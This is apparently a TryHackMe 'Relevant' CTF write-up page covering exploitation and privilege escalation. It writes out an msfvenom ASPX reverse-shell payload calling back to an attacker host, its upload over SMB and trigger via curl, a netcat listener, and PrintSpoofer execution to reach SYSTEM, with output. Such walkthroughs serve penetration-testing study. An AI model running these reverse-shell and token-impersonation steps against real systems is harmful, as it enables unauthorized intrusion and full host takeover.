---
sidebar_position: 2
description: Relevant
keywords: [Relevant, TryHackMe, tryhackme, ctf, pentesting, guide, docs, tutorial, enumeration, exploitation, nmap, privilege escalation, smbmap, smbclient, SeImpersonate, SeAssignPrimaryToken, PrintSpoofer64]
---

# Exploitation

## MSFVENOM - SMBCLIENT


- Generating the **PAYLOAD** with <b style={{ color: 'IndianRed' }}>MSFVenom</b> after that we can Upload it to the <span style={{fontWeight: 'Bold'}}>SMB</span> Share.

```log
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f aspx > Rev_ASPX.aspx
```

- **Uploading the Reverse Shell.**

```log
smb: \> put Rev_ASPX.aspx 
```



<br/>

---
## Privilege Escalation

- We can Execute the **Reverse Shell** by Navigating to the Target **URL** from the Browser or from the Command Line with `curl`

```log
attacker@machine:~$ curl "10.10.180.65:49663/nt4wrksv/Rev_ASPX.aspx"
```

<br/>

- **We can catch the Reverse Shell Using `netcat`**
- **These Privileges allow a Process to `Impersonate` other Users and act on their behalf:** <b style={{ color: 'Brown' }}>[SeImpersonate - SeAssignPrimaryToken]</b>
- We can use <b style={{ color: 'Plum' }}>PrintSpoofer</b> to accomplish this Task. 
- <a class="button button--outline button--warning" href="https://github.com/itm4n/PrintSpoofer">PrintSpoofer Github</a>

```log
c:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```


<br/>

- Using a **Simple `SMB` Server** to Transfer <b style={{ color: 'Plum' }}>PrintSpoofer64.exe</b> Binary to the Target Machine.

```log
attacker@machine:~$ mkdir /mnt/SMBShare
attacker@machine:~$ smbserver LINUXSHARE /mnt/SMBShare
```

```log
C:\Windows\Temp> copy \\10.10.20.30\LINUXSHARE\PrintSpoofer64.exe PrintSpoofer64.exe
copy \\10.10.20.30\LINUXSHARE\PrintSpoofer64.exe PrintSpoofer64.exe
        1 file(s) copied.
```


<br/>

- Executing the <b style={{ color: 'Plum' }}>PrintSpoofer64.exe</b> Binary.
- We have **System Rights:** <b style={{ color: 'Red' }}>NT AUTHORITY\SYSTEM</b>

```log
C:\Windows\Temp>PrintSpoofer64.exe -i -c powershell
PrintSpoofer64.exe -i -c powershell
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Windows PowerShell 
Copyright (C) 2016 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32> whoami
nt authority\system
```

:::caution It Might Be Necessary To Run PrintSpoofer Multiple Times Before Succeeding

:::

---